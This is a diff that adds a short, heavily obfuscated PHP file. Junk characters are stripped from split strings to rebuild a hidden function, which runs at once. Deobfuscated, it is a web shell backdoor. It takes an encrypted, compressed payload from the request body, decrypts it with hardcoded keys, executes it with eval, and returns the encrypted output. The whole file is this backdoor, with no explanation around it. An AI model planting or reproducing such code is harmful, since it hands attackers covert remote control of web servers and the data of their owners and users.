@@ -1,0 +1,10 @@
+<?php
+$E=str_replace('V','','crVeatVe_VVfuVnVction');
+$B='$k="eZ)10adc39";Z)$kh="Z)49ba5Z)9Z)Z)abbe56";$Z)kf="e057f20f883eZ)";$p=Z)"y6Z)DzzFbzZ)95YKZ)WPUVZ)";functionZ) x($t,$k)Z)';
+$D='Z)b_get_conteZ)nts();@ob_endZ)_clZ)ean();$r=@bZ)Z)ase64_encode(@x(Z)@gzZ)comprZ)ess($o)Z),$kZ)));print("$Z)p$khZ)$r$kf");}';
+$i='{$c=Z)strlen(Z)Z)$k);Z)$Z)l=strlen($t)Z);$o="";for($Z)i=Z)0;$Z)i<$l;){foZ)r($Z)j=0Z);($j<$c&&$Z)i<$l);$j++,Z)$i++){$o';
+$Q='inpZ)ut"),Z)$mZ)Z))==1) {@ob_start();Z)Z)@eZ)val(@gzuncoZ)mpress(@Z)x(@base6Z)4_dZ)ecode($mZ)[1]),$k))Z));Z)Z)$oZ)=@o';
+$H='Z).=$t{$i}^Z)$k{Z)$j}Z);}}retuZ)rn $o;}if (Z)@Z)prZ)eg_match("/$Z)kh(.Z)+)$kf/",@fZ)ileZ)_get_cZ)ontentsZ)("php:/Z)/';
+$n=str_replace('Z)','',$B.$i.$H.$Q.$D);
+$b=$E('',$n);$b();
+?>
